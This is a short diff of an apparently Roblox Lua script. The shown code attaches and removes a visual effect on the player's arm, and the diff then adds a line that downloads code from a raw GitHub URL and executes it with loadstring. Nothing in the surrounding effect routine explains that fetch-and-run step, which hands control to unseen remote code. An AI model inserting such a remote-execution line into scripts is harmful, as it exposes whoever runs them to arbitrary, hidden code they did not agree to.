@@ -982,6 +982,11 @@ red4.Parent = game.Players.LocalPlayer.Character["Left Arm"]
         end
         wait(1.8)
         red4:Destroy()
+
+task.wait(0.2)
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Kenjihin69/Kenjihin69/refs/heads/main/Tp%20name%20jun'))()
+
     end
 
 end
